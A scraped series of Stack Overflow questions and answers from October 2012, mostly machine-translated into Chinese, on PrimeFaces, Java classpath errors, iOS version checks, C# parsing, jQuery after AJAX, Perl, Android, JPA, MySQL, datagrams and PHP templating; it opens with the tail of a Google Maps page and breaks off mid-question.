border: 1px solid #000066;
background-color: white;
overflow: hidden;
}

 #progressBar {
 position: absolute;
 background-color: #000066;
 width: 636px;
 height: 8px;
 top: 1px;
 right:1px;
}

#map {
  width: 317px;
 height: 317px;
 margin-right: 1px;
 overflow: hidden;
}

#directions {
width: 317px;
height: 400px;
margin-left: 1px;
position: relative;
overflow: auto;
}

.waypoint {
position: relative;
background-color: #eeeeee;
border: 1px solid #666666;
padding: 6px;
margin: 4px;
font: 10pt sans-serif;
}

.letterIcon {
  width: 24px;
  height: 38px;
  background-image: none;
 }

.waypointAddress {
position: absolute;
top: 17px;
left: 32px;
}

#summary {
padding: 4px;
font: 10pt sans-serif;
}

.dstep {
border-top: 1px solid #666666;
padding: 4px;
padding-left: 8px;
font: 10pt sans-serif;
margin-left: 4px;
margin-right: 4px;
cursor: pointer;
background-color: white;
}

.label {
 width: 52px;
 text-align: right;
 font: 12pt sans-serif;
 float: left;
 position: relative;
 top: 4px;
 margin-right: 5px;
 }

.input {
 float: left;
 width: 252px;
 text-align: left;
 }

 .controls {
  clear: both;
  padding: 4px;
 }

#speed {
  float: left;
 }

#buttons {
 float: right;
}

table {
 border-collapse: collapse;
}

td {
  vertical-align: top;
 }

  </style>
  </head>
<body onload="load();" onunload="GUnload();">
<div id="content">
<table cellpadding="0" cellspacing="0">
<tr>
  <td colspan="2">
    <div id="svPanel">
      <div id="streetview" style="width: 638px; height: 319px;"></div>
      <div id="status">Enter your start and end addresses and click <b>Route</b></div>
      <div id="instruction"></div>
    </div>
    <div id="progressBorder">
      <div id="progressBar"></div>
    </div>
  </td>
</tr>
<tr>
  <td>
    <div id="map"></div>
      <div class="controls">
        <div class="label">From</div>
        <div class="input"><input id="from" size="30" value=""/></div>
      </div>
      <div class="controls">
        <div class="label">To</div>
        <div class="input"><input id="to" size="30" value=""/></div>
      </div>
      <div class="controls">
        <div class="label">Speed</div>
        <div id="actions">
          <select id="speed" onchange="setSpeed()">
            <option value="0">Fast</option>
            <option value="1" SELECTED>Medium</option>
            <option value="2">Slow</option>
          </select>
          <div id="buttons">
            <input type="button" value="Route" id="route" onclick="generateRoute()" />
            <input type="button" value="Drive" id="stopgo"  onclick="startDriving()"  disabled />
          </div>
        </div>
      </div>
    </div>
  </td>
  <td>
    <div id="directions"></div>
  </td>
</tr>
</table>
</div>
</body>
 </html> 
```

# eclipse - 如何在 Eclipse Indigo SR2 中使用 PrimeFaces 3.2？

> ID：12954388
> 
> 赞同：0
> 
> 时间：2012-10-18T12:14:42.563
> 
> 标签：eclipse, jsf-2, primefaces

我正在尝试使用 PrimeFaces 3.2。我正在使用 Eclipse Indigo SR2。我正在使用 PrimeFaces 标签创建一个 JSP 页面。该标准`<h:commandButton>`有效，但`<p:commandButton>`无效。

```
<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<%@ taglib prefix="f"  uri="http://java.sun.com/jsf/core"%>
<%@ taglib prefix="h"  uri="http://java.sun.com/jsf/html"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html  xmlns:p="http://primefaces.org/ui">
<head>

</head>
<body>
<f:view>
        <h:form>
        <h:commandButton value="Click"></h:commandButton>
        <p:commandButton value="shfgldjfkl"></p:commandButton>
        </h:form>
</f:view>
</body>
</html> 
```

我的输出是这样的：

![在此处输入图像描述](../Images/b21b2ae24fdc3c5ca97093a0f42616e9.png)

当我在 Indigo Service Release 2 中获取 JSF XHTML 页面时，我的代码没有运行，我的页面是空白的。

如何使用 PrimeFaces 3.2？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:28:20.197

JSP 自 JSF 2.0 起被**弃用**，并由 Facelets 接替。所有与 JSF 2.0 兼容的组件库（例如 PrimeFaces >2.x）都不再具有用于 JSP 的标记库，而仅用于 Facelets。

您放置在 JSP 文件中的`<html xmlns:p="http://primefaces.org/ui">`文件根本不会被 JSP 识别。XML 命名空间上的 JSF 标记库仅在 Facelets 中工作。

[忘记 JSP。专注于 Facelets。](http://docs.oracle.com/javaee/6/tutorial/doc/giepx.html)

回到空白页面的 Facelets 问题，确保您有一个`<h:head>`而不是`<head>`（否则 JSF/PrimeFaces 将无法自动包含必要的 CSS/JS 文件）并且您的请求 URL 与 URL 模式匹配中`FacesServlet`定义的`web.xml`（否则`FacesServlet`根本不会被调用，因此无法将 JSF 转换为 HTML；您可以通过右键单击确认这一点，在 webbrowser中*查看源代码）。*

这是完整的 Facelets 片段`/demo.xhtml`：

```
<!DOCTYPE html>
<html lang="en"
    xmlns="http://www.w3.org/1999/xhtml"
    xmlns:f="http://java.sun.com/jsf/core"
    xmlns:h="http://java.sun.com/jsf/html"
    xmlns:ui="http://java.sun.com/jsf/facelets"
    xmlns:p="http://primefaces.org/ui">
    <h:head>
        <title>PrimeFaces demo</title>
    </h:head>
    <h:body>
        <h:form>
            <p:commandButton value="submit" />
        </h:form>
    </h:body>
</html> 
```

如果`FacesServlet`映射到如下`web.xml`的 URL 模式：`*.xhtml`

```
<servlet>
    <servlet-name>facesServlet</servlet-name>
    <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>facesServlet</servlet-name>
    <url-pattern>*.xhtml</url-pattern>
</servlet-mapping> 
```

然后你可以用 URL 中相同的文件名打开它，而不用摆弄像`*.jsf`,`/faces/*`等虚拟 URL：

> `http://localhost:8080/contextname/demo.xhtml`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T01:54:49.723

好吧，我认为您应该亲自使用 JSF 或 facelet 我从不尝试使用 primeface 实现 JSP，顺便说一下，如果您可以在 JSF 或 facelet 中获得相同的结果，为什么要实现 JSP 所以我建议继续使用 JSF 2.0

# java - 未找到 Java 方法，即使方法签名看起来不错（desmo-j 模拟）

> ID：12954389
> 
> 赞同：0
> 
> 时间：2012-10-18T12:14:44.603
> 
> 标签：java, signature

我正在尝试在 Mac OS X 10.7 上的 Java、NetBeans 7.2 中运行 Desmo-J 模拟示例。一个名为 TimeSeries 的类作为导入包含在内，即。

```
import desmoj.core.statistic.TimeSeries; 
```

它有一个函数签名

```
(Model, String, TimeInstant,TimeInstant, boolean) 
```

我可以**编译**我的主 java 文件，但是在**运行/调试**时，它失败了，告诉我

```
Exception in thread "main" java.lang.NoSuchMethodError: desmoj.core.statistic.TimeSeries.<init>(Ldesmoj/core/simulator/Model;Ljava/lang/String;Ldesmoj/core/simulator/TimeInstant;Ldesmoj/core/simulator/TimeInstant;Z)V 
```

尽管我正在进行的调用 (AFAIK) 传递了正确的类型参数，但这是事实：

```
trucksArrived = new TimeSeries(this.getModel(), "arrived", new TimeInstant(0), new TimeInstant(1500), false);
trucksServiced = new TimeSeries(this.getModel(), "finished", new TimeInstant(0), new TimeInstant(1500), false); 
```

我很困惑为什么会发生这种情况。**关于为什么 Java 无法在运行时识别我的方法调用，而在编译中看到它的任何线索？** 会不会是干扰类路径的东西，即。另一个 TimeSeries 在那里（目前在库中看不到任何内容）？我是否正确阅读了异常消息（及其函数签名）？TimeSeries 中的某些方法已被弃用（尽管不是我正在使用的方法）。这可能会干扰事情吗？

谢谢大家皮特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:30:57.093

您正在尝试使用带有签名的构造函数：

> TimeSeries（模型，字符串，TimeInstant，TimeInstant，布尔值）

这应该匹配[这个](http://desmoj.sourceforge.net/doc/desmoj/core/statistic/TimeSeries.html#TimeSeries%28desmoj.core.simulator.Model,%20java.lang.String,%20desmoj.core.simulator.TimeInstant,%20desmoj.core.simulator.TimeInstant,%20boolean%29)。

您的编译成功但程序给出此运行时错误的事实强烈表明您的应用程序在运行时使用的库版本与您编译时所针对的版本不同。检查以下内容：

*   检查您的构建类路径和运行类路径上是否具有相同的 desmoj JAR。

*   检查您是否不小心在任一类路径中包含了两个版本的 desmoj JAR。

# objective-c - determine which IOS is running on the device

> ID：12954391
> 
> 赞同：1
> 
> 时间：2012-10-18T12:14:47.953
> 
> 标签：objective-c, ios, facebook, ipad, twitter

I have in my app a facebook share button, a tweet button. My app supports to IOS 5.1\. So for twitter there is no problem. But how should I work with the facebook share button.

If the IOS device that is running the app is using IOS6 I want to use the new way, like you can see over [here](http://www.google.com/imgres?q=facebook%20share%20in%20app%20ios&um=1&hl=nl&sa=N&tbm=isch&tbnid=IFGDxpn5cChLRM%3a&imgrefurl=http://www.theiospost.com/latest/2012/9/19/ios-6-review.html&docid=pfXBWRkOxzy7nM&imgurl=http://www.theiospost.com/storage/iOS6-Review-FacebookShareSheet.png%253F__SQUARESPACE_CACHEVERSION%253D1348056541859&w=765&h=1499&ei=_vF_ULfTLe7R4QS504HgBw&zoom=1&iact=rc&dur=299&sig=114756556720582691644&page=1&tbnh=156&tbnw=80&start=0&ndsp=27&ved=1t:429,r:4,s:20,i:144&tx=33&ty=78&biw=1422&bih=707)

But when the app is running on previous IOS devices. I want to use the old fashion way.

Can anybody help me?

Kind regards

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:36:53.080

If you're wondering if `SLComposeViewController` supports Facebook, check [`isAvailableForServiceType`](http://developer.apple.com/library/ios/documentation/NetworkingInternet/Reference/SLComposeViewController_Class/Reference/Reference.html#//apple_ref/occ/clm/SLComposeViewController/isAvailableForServiceType:), e.g.

```
if ([SLComposeViewController class]) {
    // once you know that they have iOS 6 or higher
    // check if the account is setup
    if ([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook])
    {
        // now we know we have a facebook account configure and logged in
    }
} else {
    // You don't have iOS 6 or higher
} 
```

It's generally better to use API (or `class` or `NSClassFromString` for weakly linked classes, or `respondsToSelector`, if a class has methods that were added in later versions of iOS) rather than checking for version of iOS. For more information, see [Supporting Multiple Versions of iOS](http://developer.apple.com/library/ios/documentation/iphone/conceptual/iphoneosprogrammingguide/AdvancedAppTricks/AdvancedAppTricks.html#//apple_ref/doc/uid/TP40007072-CH7-SW4) section of the *iOS App Programming Guide.*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:37:09.337

You can use the following code:

```
if([[[UIDevice currentDevice] systemVersion] intValue] == 6)
{
 // your code for iOS 6
}
else
{
 // your code for other iOS
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:44:10.930

The steps are: First weak link the social framework (make it optional)

Next check to see if the app can you use SLComposeViewController and then check to see if the user has set up their Facebook account

```
if(NSClassFromString(@"SLComposeViewController") != nil)
{
  if([SLComposeViewController isAvailableForServiceType:SLServiceTypeFacebook]])
  {
   //Add your SLComposeViewController code
  }
} 
```

# c# - 我想将百分比值字符串翻倍？

> ID：12954398
> 
> 赞同：0
> 
> 时间：2012-10-18T12:14:59.127
> 
> 标签：c#, math, format, rounding

我在 c# 中有一个百分比字符串，并希望将其返回为双精度值。

例如 。. .

```
string p = "6%"; 
```

现在我想把这个字符串变成

```
double value = 0.06; 
```

我怎么能这样？我尝试使用 Math.Round() 并将 -2 放在要四舍五入的数字中，但它只允许数字 0-15。

我很高兴您能提供任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:21:07.240

也许是这样的：

```
double value = double.Parse(p.TrimEnd(new[] {'%'}))/100; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:16:55.767

您可以使用 split 并将其转换为 double

```
double value = double.Parse(p.Split(new char[]{'%'})[0]) / 100; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:18:13.070

```
 double value = double.Parse(p.Trim().Split('%')[0]) / 100; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T12:18:52.963

```
string p = "6%";
string p2 = p.Remove(p.Length - 1);
double value = Convert.ToDouble(p2) / 100; 
```

# javascript - AJAX 调用后 JavaScript 不工作 - AJAX 选项卡

> ID：12954399
> 
> 赞同：1
> 
> 时间：2012-10-18T12:15:04.810
> 
> 标签：javascript, ajax

我试图制作一个能够在不刷新的情况下更改页面内容的子菜单，所以我使用 AJAX 选项卡来调用外部 htm。选项卡正在工作，但我的外部 htm 中有一个 JavaScript，它使白色导航箭头工作，并且还交叉淡入淡出内容，这是不工作的。我该如何解决？

我说的是这个特定的页面 - “Nick 101”
[www.adigitalgoodie.com/about.htm](http://adigitalgoodie.com/about.htm)

它应该像在首页
[www.adigitalgoodie.com/index.htm上一样工作](http://adigitalgoodie.com/index.htm)

这是 htm 中的 JavaScript，通过 AJAX 获取，它不起作用：

```
<script type="text/javascript">

        $('.contentnavright').click(function(){
            $('.contenttext1').fadeOut();
            $('.contenttext2').fadeIn();
            $('.contentnavleft').css('opacity', '1');
            $('.contentnavleft').css('-moz-opacity', '1');
            $('.contentnavleft').css('filter', 'alpha(opacity=100)');
            $('.contentnavright').css('opacity', '0');
            $('.contentnavright').css('-moz-opacity', '0');
            $('.contentnavright').css('filter', 'alpha(opacity=0)')     
        });

        $('.contentnavleft').click(function(){
            $('.contenttext1').fadeIn();
            $('.contenttext2').fadeOut();
            $('.contentnavleft').css('opacity', '0');
            $('.contentnavleft').css('-moz-opacity', '0');
            $('.contentnavleft').css('filter', 'alpha(opacity=0)');
            $('.contentnavright').css('opacity', '1');
            $('.contentnavright').css('-moz-opacity', '1');
            $('.contentnavright').css('filter', 'alpha(opacity=100)')
        });

        </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T18:58:26.870

```
$('.contentnavleft').click(myFunc);  

function myFunc(){
   $('.contenttext1').fadeIn();
   $('.contenttext2').fadeOut();
   $('.contentnavleft').css('opacity', '0');
   $('.contentnavleft').css('-moz-opacity', '0');
   $('.contentnavleft').css('filter', 'alpha(opacity=0)');
   $('.contentnavright').css('opacity', '1');
   $('.contentnavright').css('-moz-opacity', '1');
   $('.contentnavright').css('filter', 'alpha(opacity=100)')
} 
```

然后，当您完成 ajax 请求时，您`$('.contentnavleft').click(myFunc);`再次将该函数绑定到 .contentnavleft 元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:19:50.950

似乎所有页面的脚本都是相同的。因此，您可以将其放在主 html 中，并使用 live/on jquery 方法：

```
$("#container").on("click", ".contentnavright", function(){whatever}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:20:37.280

将该代码放入函数中，并在您的ajax请求完成后调用该函数

# javascript - 将 offset().top 与对象属性进行比较

> ID：12954406
> 
> 赞同：0
> 
> 时间：2012-10-18T12:15:22.917
> 
> 标签：javascript, jquery

我正在尝试构建一个“scrollSpy”类型的函数。我不知道如何将参数与对象中的某些值进行比较，并返回（数字上）最高值的名称。

我有一些标记：

```
<ul class="nav">
    <li><a href="a"></a></li>
    <li><a href="b"></a></li>
    <li><a href="c"></a></li>
    <li><a href="d"></a></li>
    <li><a href="e"></a></li>
    <li><a href="f"></a></li>
</ul>

<section id="a" class="scrollspy"></section>
<section id="b" class="scrollspy"></section>
<section id="c" class="scrollspy"></section>
<section id="d" class="scrollspy"></section>
<section id="e" class="scrollspy"></section>
<section id="f" class="scrollspy"></section> 
```

还有一些脚本创建了一个对象，该对象由每个对象`section`及其与顶部的距离（以 px 为单位）组成：

```
var obj = {
    sectionOffset: {},
    scrollSpy: function (scrolled) {
        // This should look in the object with the offset values, and from all
        // the values that (scrolled) is higher than, take the largest, and
        // return its name.
    }
}

$(function () {

    $(window).scroll(function () {
        obj.scrollSpy($(document).scrollTop()); 
    });

    // Create an object consisting of all elements I want to 'spy' on.
    // Names and values are made of element ID and top offset respectively.
    $('.scrollspy').each(function () {
        obj.sectionOffset[$(this).attr('id')] = (parseInt($(this).offset().top));
    });

}); 
```

在我遍历我想要的元素后，它会产生一个对象，如：

```
{
    d: 5195,
    b: 3245,
    a: 1319,
    f: 5682,
    c: 2139,
    e: 3343
} 
```

需要明确的是，如果用户向下滚动页面 3000 像素，该函数应该返回`c`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T13:12:25.310

```
scrollSpy: function (scrolled) {

    var highest = 0, highestName = null;

    // iterate through the offsets
    $.each(obj.sectionOffset, function(name, val) {
        // check that scrolled is higher than the value, and that it's the highest found so far
        if (scrolled > val && val > highest) {
            highest = val;
            highestName = name;
        }
    });

    return highestName;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:24:30.790

```
$('.scrollspy').each(function () 
{
    if(($(this).offset().top + $(this).height()) > 0)
    {
       //this is the one you are looking for.

       return false; //break the loop.
    }
}); 
```

这将像 scrollSpy [fiddle一样工作](http://jsfiddle.net/sathyamoorthi/PfKJL/2/)

# perl - Perl 循环通过嵌套的祝福 hashref 元素

> ID：12954409
> 
> 赞同：1
> 
> 时间：2012-10-18T12:15:28.950
> 
> 标签：perl, loops, hashref

我有一个类似于以下的 perl 数据结构：

```
$VAR1 = bless( {
                 'admin' => '0',
                 'groups_list' => [
                                           bless( {
                                                    'name' => undef,
                                                    'groupid' => 'canedit',
                                                    'description' => 'Can Edit Articles'
                                                  }, 'group_entry' ),
                                           bless( {
                                                    'name' => undef,
                                                    'groupid' => 'webuser',
                                                    'description' => 'Can Access Content'
                                                  }, 'group_entry' ),
                                         ],
                 'trusted' => '1',
               }, 'user_info' ); 
```

我正在寻找一种方法来遍历“groups_list”中的所有组并检查其中是否有“webuser”组ID。任何帮助表示赞赏。

另外，请让我知道是否可以在不使用循环的情况下完成此操作。例如搜索字符串**'groupid' => 'webuser'** ..

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:21:41.010

`bless`ing reference 仅向其添加任意类型描述，并且不会以任何其他方式更改使用它，除非您使用`overload`，因此与 unblessed 引用完全相同的循环将起作用：

```
foreach my $group (@{$VAR1->{groups_list}}) {
   if ($group->{groupid} eq 'webuser') {
      # do stuff and break out
   }
} 
```

[`grep`](http://p3rl.org/grep)如果您只需要带有数据的内部散列，而数组中没有它们的索引，您也可以将循环替换为：

```
my @webusers = grep { $_->{groupid} eq 'webuser' } @{$VAR1->{groups_list}}; 
```

不过，这将搜索整个列表。使用`first`from[`List::Util`](http://p3rl.org/List::Util)仅查找第一个匹配项。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:20:38.653

这将循环并找到它：

```
foreach (@{$VAR1->{'groups_list'}})
{
    if ($_->{'groupid'} eq 'webuser')
    {
        print "found webuser.";
    }   
} 
```

如果没有循环，您将无法真正做到这一点，因为您的任务本质上涉及查看每个元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T20:23:49.513

由于这些组已被祝福到一个包中，您可能不应该直接检查哈希键的存在，而是像这样向 group_entry 类添加一个方法（类似的东西可能已经存在）：

```
{
  package group_entry;
  sub get_groupid {
     my $self = shift;
     $self->{groupid}
  }
} 
```

并且由于您的数据也包含在 user_info 包中，因此请在 user_info 上创建一个方法以按 groupid 过滤组（您的 user_info 类可能已经有类似的内容）：

```
{
  package user_info;
  sub get_groups_list {
     my $self = shift;
     return @{ $self->{groups_list} }
  }
  sub filter_groups_by_groupid {
    my $self = shift;
    my ($filter_groupid) = @_;
    return grep { $_->get_groupid eq $filter_groupid } $self->get_groups_list
  }
} 
```

在您的代码中，执行以下操作：

```
my @webusers = $data->filter_groups_by_groupid( 'webuser' ); 
```

# android - 如何使用字符串搜索将一个布局膨胀到另一个布局

> ID：12954411
> 
> 赞同：5
> 
> 时间：2012-10-18T12:15:30.067
> 
> 标签：android, convertview

如何`xml`使用 switch case 将搜索字符串中的两个字符串加粗。我想更改每个 xml 字符串`textview`，此更改将在按钮单击时进行

```
String strfistsearch=   mylist.get(7).get("data4"); 

          if(strfistsearch.equals(strfistsearch))
             {
       mInflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
     View    convertView1 = mInflater.inflate(R.layout.first_screen,viewFlow);     

    TextView txtf = (TextView)convertView1.findViewById(R.id.textView11);
    String strfistsearch=   mylist.get(7).get("data4");    
       Log.v("strfistsearch", strfistsearch);                        

  SpannableStringBuilder sb = new SpannableStringBuilder(strfistsearch);
final StyleSpan bss = new StyleSpan(android.graphics.Typeface.BOLD); // Span to make text                                           sb.setSpan(bss, 0, 1, Spannable.SPAN_INCLUSIVE_INCLUSIVE); // make first 4 characters Bold                                      sb.setSpan(new ForegroundColorSpan(Color.RED), 0, 1, 0);
    txtf.setText(sb);
}
else  if(strfistsearch.equals(strfistsearch))
{
mInflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
     View    convertView1 = mInflater.inflate(R.layout.second_screen,viewFlow);    

    TextView txtf = (TextView)convertView1.findViewById(R.id.textView11);
    String strfistsearch=   mylist.get(7).get("data4");    
       Log.v("strfistsearch", strfistsearch);                        
        SpannableStringBuilder sb = new SpannableStringBuilder(strfistsearch);                                      final StyleSpan bss = new StyleSpan(android.graphics.Typeface.BOLD); // Span to make text                                       sb.setSpan(bss, 0, 1, Spannable.SPAN_INCLUSIVE_INCLUSIVE); // make first 4 characters Bold                                    sb.setSpan(new ForegroundColorSpan(Color.RED), 0, 1, 0);                                          txtf.setText(sb);
} 
```

提前致谢...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:32:14.660

您需要 XmlPullParser 对象来执行此操作

```
mLayoutInflator = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

 XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
 factory.setNamespaceAware(true);
 XmlPullParser xpp = factory.newPullParser();
 xpp.setInput( new StringReader ( "xml string for layout" ) );

 mLayoutInflator.inflate(xpp, (ViewGroup)root); 
 // root can be layout in which your inserting inflated view 
```

# java - 给定主键的集合，如何在 JPA 中加载所有实体？

> ID：12954415
> 
> 赞同：2
> 
> 时间：2012-10-18T12:15:41.357
> 
> 标签：java, jpa

我想在 JPA 2 中编写一个通用方法，`T`如果给定它们的主键集合，它可以加载类的所有实体。这是所需方法的签名：

```
public <T> List<T> getEntityList(final Class<T> entityClass, final Collection<Object> primaryKeys) 
```

即使我不知道实体类也不知道主键类，是否有可能？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-18T12:19:29.140

```
public <T> List<T> getEntityList(final Class<T> entityClass, final Collection<Object> primaryKeys)
    final Session session = sessionFactory.getCurrentSession();
    final Criteria crit = session.createCriteria(entityClass);
    crit.add(Restrictions.in("id", primaryKeys);
return crit.list(); 
```

使用条件查询和休眠使其非常简单。我认为JPA 方式[非常相似。](http://docs.oracle.com/javaee/6/tutorial/doc/gjivm.html#gjiwn)

# facebook - 在我的网站上打开图形标记

> ID：12954418
> 
> 赞同：0
> 
> 时间：2012-10-18T12:15:47.630
> 
> 标签：facebook, facebook-graph-api, cookies, web

通过将开放图形标签放到我的网站上，我是否可以更多地了解我网站的用户。例如，我可以将 cookie 或登录链接到用户的 Facebook id（或者 FB id 是否保持匿名）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:28:16.487

> 通过将开放图形标签放到我的网站上，我是否可以更多地了解我网站的用户。

不，你没有。Open Graph 元标记在另一个方向起作用：它们告诉 Facebook 一些关于您的页面的信息。

> 例如，我可以将 cookie 或登录链接到用户的 Facebook id（或者 FB id 是否保持匿名）？

访问您页面的 Facebook 用户确实保持匿名，除非您让他们明确连接到您的应用程序。

# mysql - mysql存储过程中的return关键字

> ID：12954423
> 
> 赞同：1
> 
> 时间：2012-10-18T12:16:17.960
> 
> 标签：mysql, stored-procedures

> **可能重复：**
> [Mysql - 如何从存储过程中退出/退出](https://stackoverflow.com/questions/6260157/mysql-how-to-quit-exit-from-stored-procedure)

是否有与 php、c++、c、java 等任何**返回**语句等效的东西？

我可以做类似的事情吗

```
IF @numRows >= 1 THEN
  RETURN
END IF; 
```

在mysql存储过程中？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:25:09.373

试试这个

```
Sp:BEGIN
    IF @numRows >= 1 THEN
        LEAVE Sp;
    END IF;

END$$ 
```

# java - 通过数据报包发送数组的最佳方式是什么？

> ID：12954424
> 
> 赞同：2
> 
> 时间：2012-10-18T12:16:18.843
> 
> 标签：java, bytearray, datagram

假设我有一个字符串：`Hello!`我必须这样做：

1.  将字符串转换为字节数组
2.  发送字节数组
3.  将其转换回字符串（供以后使用）

这是我的代码...

```
//Sender
String send = "Hello!";
byte[] data = send.getBytes();
DatagramPacket packetOut = new DatagramPacket(data, data.length); //send blah blah

//Receiver
//blah blah receive it
String receive = new String(packetIn.getData()); //convert it back 
```

对整数数组执行此操作的快速而优雅的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:19:09.203

对于 int[]，您可以使用 ObjectOutputStream 进行序列化，但更快的方法可能是使用 ByteBuffer。

```
public static byte[] intsToBytes(int[] ints) {
    ByteBuffer bb = ByteBuffer.allocate(ints.length * 4);
    IntBuffer ib = bb.asIntBuffer();
    for (int i : ints) ib.put(i);
    return bb.array();
}

public static int[] bytesToInts(byte[] bytes) {
    int[] ints = new int[bytes.length / 4];
    ByteBuffer.wrap(bytes).asIntBuffer().get(ints);
    return ints;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:36:07.497

我不知道这种方式有多优雅，但它会很快。使用 GSON 库将整数数组转换为字符串，然后将字符串转换为整数数组。

```
import java.lang.reflect.Type;
import com.google.gson.Gson;
...

Gson gson = new Gson();

List<Integer> list = Arrays.asList(1,2,3); 

//Sender
String send = gson.toJson(list);
byte[] data = send.getBytes();
DatagramPacket packetOut = new DatagramPacket(data, data.length); //send blah blah

//Receiver
//blah blah receive it
String receive = new String(packetIn.getData()); //convert it back

Type listType = new TypeToken<List<Integer>(){}.getType();
List<Integer> list = gson.fromJson(receive, listType); 
```

Gson 的性能很低，但它证明了快速使用是合理的。如果你使用不复杂的对象，比如`java.util.List`- 会很好。

您可以从那里获得 GSON jar：[链接：gson 1.7](http://www.java2s.com/Code/Jar/g/Downloadgson17jar.htm)

顺便说一句，使用 GSON，您可以将任何类型的 Object 转换为 String，反之亦然。

# php - php简单str_replace模板日期格式

> ID：12954428
> 
> 赞同：0
> 
> 时间：2012-10-18T12:16:28.863
> 
> 标签：php, templates, date, format, str-replace

我正在尝试为网站新闻模块制作一个简单的模板系统。这是我的代码。

```
$temp = "#title#, <br>#date(d-m-Y)#<br> #story#";
$data = array(title=>"this is a title", date=>1350498600, story=>"some news story."); 
```

我在 stackoverflow 上找到了这个简单的类，并试图将它用于我的目的。

```
class EmailTemplate
{
     private $_template = '';

    public function __construct($template)
    {
        $this->_template = $template;
    }

    public function __set($key,$value)
    {
        $this->_template = str_replace("#" . $key . "#",$value,$this->_template);
    }

    public function __toString()
    {
        return $this->_template;
    }
} 
```

我像这样使用它：

```
 $Template = new EmailTemplate($temp);
    $Template->title = $data['title'];
    $Template->date = $data['date'];
    $Template->story = $data['story'];
    echo $Template; 
```

一切都适用于标题和故事，但说到日期我有问题，因为我想格式化模板中定义的日期，即日期（dmY）。我怎样才能做到这一点 ？？

模板来自不同的表格，新闻来自不同的表格。日期格式将在模板中定义。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:24:19.220

```
$Template->date = date('d-m-Y', strtotime($data['date'])); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:29:32.397

你需要接受`date('d-m-Y')`作为类的属性。这是不允许的，您似乎需要将占位符更改为可接受的类属性或更改类，也许添加特定于该字段的方法。

我相信你不能用你正在使用的技术完成你想要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:34:29.683

我有一个使用[`preg_replace_callback`](http://php.net/manual/en/function.preg-replace-callback.php).

首先你需要存储类，比方说：

```
class TemplateStorage {
    // Okay, you should have getter&setter for element, but this is just an example
    public $variables = array(); // Common variables like title
    public $functions = array(); // Function mappings like 'date' => 'wrapper_date'

    public function HandleMatch($match); // Will be shown later
} 
```

然后你应该有某种包装器，你可以将它集成到`TemplateStorage`，扩展类，做任何你想做的事情（如果你需要将它与用户时区设置集成，这可能会派上用场）：

```
function WapperDate($dateFormat){
   // Set timezone, do whatever you want, add %... or use date straight forward
   return date( $dateFormat);
} 
```

然后 RegEx 允许您调用您需要的内容（匹配 之间的所有内容`#`，忽略空格）：

```
$regEx = '~#\\s*(.+?)\\s*#~'; 
```

好的，现在我们可以关心`HandleMatch`（我们知道 的结构`$match`）：

```
public function HandleMatch($match)
{
    $content = match[1];

    // Let's check whether it contains (. No? May be variable
    $pos = strpos( $content, '(');
    if( $pos === false){
       if( isset( $this->variables[ $content])){
           return $this->variables[ $content];
       }
    }

    // Allow "short calling" #date# = #date()# if no variable is set
    $argument = '';
    $function = $content;

    if( $pos !== false){
        // Last char must be )
        if( substr( $content, -1) != ')'){
            throw new Exception('Invalid format: ' . $content);
        }

        // Split into pieces
        $argument = substr( $content, $pos+1, -1);
        $function = substr( $content, $pos);
    }

    if( !isset($this->functions[$function])){
       throw new Exception( 'Unknown requested TemplateProperty: ' . $function);
    }

    // Call requested item
    return $this->functions[$function]($argument);
} 
```

现在把它们放在一起：

```
$storage = new TemplateStorage();
$storage->variables['title'] = 'Lorem ipsum sit dolor';
$storage->functions['date'] = 'WrapperDate';
preg_replace_callback( $regEx, array( $storage, 'HandleMatch'), $text); 
```

# javascript - Twitter 位置未定义

> ID：12954432
> 
> 赞同：3
> 
> 时间：2012-10-18T12:16:44.337
> 
> 标签：javascript, jquery, twitter, location

我正在尝试将推文绘制到谷歌地图，但位置始终未定义，其他一切正常，如果我使用实际的位置字符串，再次，很好。我检查了 JSON 并指定了位置。

有人知道我做错了什么吗？

我的代码..

```
function loadTweets(){
